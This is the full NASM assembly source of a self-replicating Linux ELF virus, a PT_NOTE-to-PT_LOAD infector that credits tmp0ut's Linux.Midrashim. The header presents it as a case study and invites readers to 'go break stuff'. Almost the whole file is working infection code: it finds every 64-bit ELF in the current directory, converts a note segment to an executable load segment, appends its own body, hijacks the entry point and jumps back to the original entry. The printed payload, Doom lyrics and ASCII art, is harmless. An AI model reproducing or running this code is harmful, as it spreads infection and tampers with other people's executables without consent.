;-----------------------------------------------------------------------------------insert-coin--;
; Written by defectiv3                                                                           ;
;                                                                                                ;
; A case study and implementation of the PT_NOTE->PT_LOAD infector, based on the tmp0ut's 1.01   ;
; article and highly ~~copied from~~ inspired by Linux.Midrashim and with some notes of          ;
; Linux.Kropotkine.                                                                              ;
;                                                                                                ;
; It mostly works the same as Midrashim but has some smol differences, such as mapping the       ;
; infected file into memory using mmap() and... that's it. (. ᴗ .) However it does not detect if ;
; it's on a first run, nor is the payload encoded. May that change during our lifetime~          ;
;                                                                                                ;
; Payload doesn't bite, just prints the lyrics to "I, dogma", the opening to the Doom (2016)     ;
; soundtrack, pretty random but it's a cool intro!                                               ;
;                                                                                                ;
; compile with> nasm -f elf64 -o infector.o infector.s; ld -o infector infector.o                ;
;                                                                                                ;
; Same shit as the other ones, use it at your own risk and go break stuff <3                     ;
;                                                                                                ; 
; :: references ::                                                                               ; 
; - https://tmpout.sh/1/2.html                                                                   ; 
; - https://tmpout.sh/1/Linux.Midrashim.asm                                                      ;
; - https://tmpout.sh/1/Linux.Kropotkine.asm                                                     ;
; - elf64 spec; intel manual vol. 2 (for ixs details); nasm docs (for nasm specific stuff)       ;
;------------------------------------------------------------------------------------------------;


;-------------- syscalls ---------------;
%define SYS_WRITE       1               ;
%define SYS_OPEN        2               ;
%define SYS_CLOSE       3               ;
%define SYS_FSTAT       5               ;
%define SYS_MMAP        9               ;
%define SYS_MUNMAP      11              ;
%define SYS_PREAD64     17              ;
%define SYS_MSYNC       26              ;
%define SYS_EXIT        60              ;
%define SYS_FTRUNCATE   77              ;
%define SYS_GETDENTS64  217             ;
;---------------- stack ----------------;
%define ST_DIRENT_SIZE_OFF  1024        ;
%define ST_OPEN_FILE_FD     1032        ;
%define ST_FILE_STAT        1040        ;
%define ST_OPEN_FILE_ADDR   1184        ;
%define ST_FILE_EHDR        1192        ;
%define ST_FILE_PHDR_VADDR  1200        ;
%define ST_PAYLOAD_ADDR     1500        ;
;--------------- symbols ---------------;
%define STDOUT      1                   ;
%define O_RDONLY    0                   ;
%define O_RDWR      2                   ;
%define DT_REG      8                   ;
%define MS_SYNC     4                   ;
%define PROT_READ   1                   ;
%define PROT_WRITE  2                   ;
%define MAP_SHARED  1                   ;
%define PT_LOAD     1                   ;
%define PT_NOTE     4                   ;
%define ELFCLASS64  2                   ;
%define PF_X        1                   ;
%define PF_R        4                   ;
%define TAG         0xdeadc0de          ;
%define VX_SIZE0    v_stop - _start     ;
%define VX_SIZE1    VX_SIZE0 + 5        ;
;--------------- structs ---------------;
struc dirent                            ;
.d_ino    resq 1                        ;
.d_off    resq 1                        ;
.d_reclen resw 1                        ;
.d_type   resb 1                        ;
.d_name   resb 1 ; variable length arr  ;
endstruc                                ;
                                        ;
struc stat                              ;
.st_unused0 resb 48                     ;
.st_size    resq 1                      ;
endstruc                                ;
                                        ;
struc e_ehdr                            ;
.e_ident_mag   resb 4                   ;
.e_ident_class resb 1                   ;
.e_ident_      resb 4                   ;
.e_ident_pad   resb 7                   ;
.e_type        resw 1                   ;
.e_machine     resw 1                   ;
.e_version     resd 1                   ;
.e_entry       resq 1                   ;
.e_phoff       resq 1                   ;
.e_shoff       resq 1                   ;
.e_flags       resd 1                   ;
.e_ehsize      resw 1                   ;
.e_phentsize   resw 1                   ;
.e_phnum       resw 1                   ;
.e_shentsize   resw 1                   ;
.e_shnum       resw 1                   ;
.e_shstrndx    resw 1                   ;
endstruc                                ;
                                        ;
struc e_phdr                            ;
.p_type   resd 1                        ;
.p_flags  resd 1                        ;
.p_offset resq 1                        ;
.p_vaddr  resq 1                        ;
.p_paddr  resq 1                        ;
.p_filesz resq 1                        ;
.p_memsz  resq 1                        ;
.p_align  resq 1                        ;
endstruc                                ;
;---------------------------------------;
    
global _start
section .text

_start:
    push rdx
    push rsp
    sub  rsp, 5000
    mov  r15, rsp

read_dir:
    push "."
    mov rax, SYS_OPEN                             ; open() current directory
    mov rdi, rsp
    mov rsi, O_RDONLY
    xor rdx, rdx
    syscall

    pop  rdi
    test rax, rax
    js   infected                                     

    mov rdi, rax
    lea rsi, [r15]
    mov rdx, 1024
    mov rax, SYS_GETDENTS64                       ; getdents64() all the files in the directory,
                                                  ; non recursively
    syscall

    test rax, rax
    js   infected

    mov qword [r15+ST_DIRENT_SIZE_OFF], rax

    mov rax, SYS_CLOSE
    syscall

    xor rcx, rcx
.loop_dirent:
    push rcx

    cmp byte [r15+rcx+dirent.d_type], DT_REG      ; check if the file is a regular file
    jne .loop_continue                            ; skip it otherwise

.open_file:
    mov rax, SYS_OPEN
    lea rdi, byte [r15+rcx+dirent.d_name]
    mov rsi, O_RDWR
    xor rdx, rdx
    syscall

    test rax, rax
    js   .loop_continue
    mov dword [r15+ST_OPEN_FILE_FD], eax          ; store file FD in the stack

    mov rdi, rax
    lea rsi, qword [r15+ST_FILE_EHDR]
    mov rdx, 16
    mov r10, 0
    mov rax, SYS_PREAD64                          ; read its first 16 bytes to look for an ELF
                                                  ; header
    syscall

    test rax, rax
    js   .close_file
    
.is_elf:
    cmp dword [r15+ST_FILE_EHDR], 0x464c457f
    jne .close_file

.is_x64:
    cmp byte [r15+ST_FILE_EHDR+e_ehdr.e_ident_class], ELFCLASS64
    jne .close_file

.is_infected:
    cmp dword [r15+ST_FILE_EHDR+e_ehdr.e_ident_pad], TAG
    jne process_file

.close_file:
    mov rax, SYS_CLOSE
    mov rdi, qword [r15+ST_OPEN_FILE_FD]
    syscall

.loop_continue:
    pop rcx
    add cx,  word [r15+rcx+dirent.d_reclen]
    cmp rcx, [r15+ST_DIRENT_SIZE_OFF]
    jne .loop_dirent
    jmp infected

process_file: ; file is valid up to this point, so gotta infect the shit out of it
.get_file_size:
    mov edi, dword [r15+ST_OPEN_FILE_FD]
    lea rsi, qword [r15+ST_FILE_STAT]
    mov rax, SYS_FSTAT
    syscall

    test rax, rax
    js .close_file
    
.truncate_file: ; truncate the file to include the size of the virus
    mov rsi, qword [r15+ST_FILE_STAT+stat.st_size]
    add rsi, VX_SIZE1
    mov rax, SYS_FTRUNCATE
    syscall

    test rax, rax
    jnz .close_file

.map_file:
    xor rax, rax
    mov rax, SYS_MMAP
    mov rdi, 0
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_SHARED
    mov r8,  qword [r15+ST_OPEN_FILE_FD]
    mov r9,  0
    syscall

    test rax, rax                                 ; test rax for the range -1=..=-4095
    jns  .open_file_end                           ; the syscall errno range
    cmp  rax, -4095
    jge .close_file                               ; technically if mmap() fails, the file should be
                                                  ; truncated back to its original size, yet I'm
                                                  ; lazy (≧ヘ≦)

.open_file_end:
    mov r14, rax                                  ; store the mmap()ed address on r14
    mov r13, qword [r14+e_ehdr.e_entry]           ; store the original entrypoint on r13
    xor rcx, rcx

.search_ptnote:
    xor rax, rax                                  ; compute offset from the fiest phdr to the curr one
    mov ax,  word [r14+e_ehdr.e_phentsize]
    mul rcx

    add rax, [r14+e_ehdr.e_phoff]                 ; add the offset to get to the first phdr

    cmp dword [r14+rax], PT_NOTE
    je  .infect_ptnote

    inc  rcx
    cmp  cx, word [r14+e_ehdr.e_phnum]            ; check if rcx == ehdr.phnum
    je   .unmap_file                              ; if so, no ptnote section in the binary
    jmp  .search_ptnote                           ; else continue looking
    
.infect_ptnote:
    mov dword [r14+rax], PT_LOAD                  ; change type to PT_LOAD
    mov dword [r14+rax+e_phdr.p_flags], PF_X|PF_R ; make segment executable

    mov rcx, [r15+ST_FILE_STAT+stat.st_size]      ; compute end of the original file
    mov [r14+rax+e_phdr.p_offset], rcx            ; set segment offset to it

    add ecx, 0x0c000000                           ; compute a virtual region that is unlikely to be
                                                  ; mapped by another segment
    mov qword [r15+ST_FILE_PHDR_VADDR], rcx       ; store it into stack
    mov qword [r14+rax+e_phdr.p_vaddr], rcx       ; and set p_vaddr to it

    mov qword [r14+e_ehdr.e_entry], rcx           ; set e_entry to the segment's vaddr
    mov dword [r14+e_ehdr.e_ident_pad], TAG       ; set tag to indicate infection

    add qword [r14+rax+e_phdr.p_filesz], VX_SIZE1 ; add the virus size to the segment's filesz
    add qword [r14+rax+e_phdr.p_memsz],  VX_SIZE1 ; same for the segment's memsz

    ; this thing is called delta offset trick, it computes the offset to the start of our code at
    ; compile time, which then can be used once the virus is running on infected binaries to know
    ; our relative position on memory and reference things from that.
    call .delta
.delta:
    pop rbp
    sub rbp, .delta

    mov rcx, 0
    mov rbx, VX_SIZE0
    mov r12, qword [r15+ST_FILE_STAT+stat.st_size]

.copy_virus: ; write the virus at the end of the file 
    mov rax, r12
    add rax, rcx
    mov r11b, byte [rbp+_start+rcx]
    mov byte [r14+rax], r11b

    inc rcx
    cmp rcx, rbx
    jne .copy_virus

.patch_jmp: ; patch a jmp to the original entrypoint
    mov rax, r12
    add rax, rcx

    ; jmp_off = e_entry - (vaddr + (v_stop - v_start) + 5)
    mov rbx, qword [r15+ST_FILE_PHDR_VADDR]
    add rbx, VX_SIZE1
    sub r13, rbx

    mov byte  [r14+rax],   0xe9                   ; jump imm32
    mov dword [r14+rax+1], r13d                   ; imm32

.resync_file: ; ensure changes are written back to the file
    mov rax, SYS_MSYNC
    mov rdi, r14
    mov rsi, qword [r15+ST_FILE_STAT+stat.st_size]
    add rsi, VX_SIZE1
    mov rdx, MS_SYNC
    syscall

.unmap_file:
    mov rax, SYS_MUNMAP
    mov rdi, r14
    mov rsi, qword [r15+ST_FILE_STAT+stat.st_size]
    add rsi, VX_SIZE1
    syscall

.close_file:
    jmp read_dir.close_file

infected:
call .payload
.msg:
    db "=================     ===============     ===============   ========  ========",10
    db "\\ . . . . . . .\\   //. . . . . . .\\   //. . . . . . .\\  \\. . .\\// . . //",10
    db "||. . ._____. . .|| ||. . ._____. . .|| ||. . ._____. . .|| || . . .\/ . . .||",10
    db "|| . .||   ||. . || || . .||   ||. . || || . .||   ||. . || ||. . . . . . . ||",10
    db "||. . ||   || . .|| ||. . ||   || . .|| ||. . ||   || . .|| || . | . . . . .||",10
    db "|| . .||   ||. _-|| ||-_ .||   ||. . || || . .||   ||. _-|| ||-_.|\ . . . . ||",10
    db "||. . ||   ||-'  || ||  `-||   || . .|| ||. . ||   ||-'  || ||  `|\_ . .|. .||",10
    db "|| . _||   ||    || ||    ||   ||_ . || || . _||   ||    || ||   |\ `-_/| . ||",10
    db "||_-' ||  .|/    || ||    \|.  || `-_|| ||_-' ||  .|/    || ||   | \  / |-_.||",10
    db "||    ||_-'      || ||      `-_||    || ||    ||_-'      || ||   | \  / |  `||",10
    db "||    `'         || ||         `'    || ||    `'         || ||   | \  / |   ||",10
    db "||            .===' `===.         .==='.`===.         .===' /==. |  \/  |   ||",10
    db "||         .=='   \_|-_ `===. .==='   _|_   `===. .===' _-|/   `==  \/  |   ||",10
    db "||      .=='    _-'    `-_  `='    _-'   `-_    `='  _-'   `-_  /|  \/  |   ||",10
    db "||   .=='    _-'          `-__\._-'         `-_./__-'         `' |. /|  |   ||",10
    db "||.=='    _-'                                                     `' |  /==.||",10
    db "=='    _-'                                                            \/   `==",10
    db "\   _-'                                                                `-_   /",10
    db " `''                                                                      ``' ",10,10
    db "In the first age, in the first battle",10
    db "When the shadows first lengthened, one stood",10
    db "He chose the path of perpetual torment",10
    db "In his ravenous hatred, he found no peace",10
    db "And with boiling blood, he scoured the umbral plains,",10
    db "seeking vengeance against the dark lords who had wronged him",10
    db "And those that tasted the bite of his sword named him...",10
    db "The Doom Slayer",10
    dw 0x0
    len equ $-.msg

.payload:
    pop rsi                                       ; pop rip into rsi, which contains the address to .msg
    mov rdi, STDOUT
    mov rdx, len
    mov rax, SYS_WRITE
    syscall

.cleanup:
    add rsp, 5000
    pop rsp
    pop rdx

v_stop:
    mov rdi, 0
    mov rax, SYS_EXIT 
	syscall
